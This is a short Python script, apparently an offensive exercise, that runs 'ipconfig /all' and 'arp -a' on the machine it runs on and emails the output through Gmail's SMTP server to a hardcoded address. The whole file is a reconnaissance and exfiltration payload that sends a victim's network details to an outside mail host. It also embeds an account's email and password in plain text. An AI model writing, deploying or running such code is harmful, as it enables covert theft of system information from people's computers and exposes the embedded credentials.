#!/usr/bin/env python

import subprocess
import smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command1 = "ipconfig /all"
command2 = "arp -a"
result1 = subprocess.check_output(command1, shell=True)
result2 = subprocess.check_output(command2, shell=True)
send_mail("boggrom@gmail.com", "h3z9y85$", "IPCONFIG /ALL\\r\\n" + result1 + "ARP -A\\r\\n" + result2)